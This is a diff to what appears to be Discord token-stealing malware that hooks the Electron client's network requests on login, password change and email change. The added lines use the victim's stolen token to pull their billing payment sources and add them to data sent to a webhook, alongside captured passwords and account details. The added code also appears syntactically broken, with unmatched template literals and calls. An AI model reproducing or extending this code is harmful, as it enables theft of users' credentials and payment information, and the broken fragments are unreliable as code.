@@ -347,6 +347,11 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 			const password = data.password;
 			const window = BrowserWindow.getAllWindows()[0];
 			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((sex) => {
 				window.webContents.executeJavaScript(`
 
     const json = JSON.parse(info);
@@ -405,7 +410,7 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 })
     
 			}))
-
+}))
 		}
 	}
 	if (details.url.endsWith("users/@me")) {
@@ -415,7 +420,11 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
 					const window = BrowserWindow.getAllWindows()[0];
 					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
-						
+						var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((sex) => {
 window.webContents.executeJavaScript(`
 var xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
@@ -458,7 +467,7 @@ xmlHttp.responseText;`, !0).then((info) => {
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `${PM(token)}`,
+                            "value": `${PM(sex)}`,
                             "inline": false
     },
 
@@ -475,14 +484,18 @@ xmlHttp.responseText;`, !0).then((info) => {
     }
     SendToWebhook(JSON.stringify(params))
 })
-                    
+                    }))
                     
 					}))
 				}
 				if (data.email != null && data.email != undefined && data.email != "") {
 					const window = BrowserWindow.getAllWindows()[0];
 					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
-						
+				var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((sex) => {		
 window.webContents.executeJavaScript(`
 var xmlHttp = new XMLHttpRequest();
 xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
@@ -542,7 +555,7 @@ xmlHttp.responseText;`, !0).then((info) => {
     }
     SendToWebhook(JSON.stringify(params))
 })
-                    
+                    }))
                     
 					}))
 				}
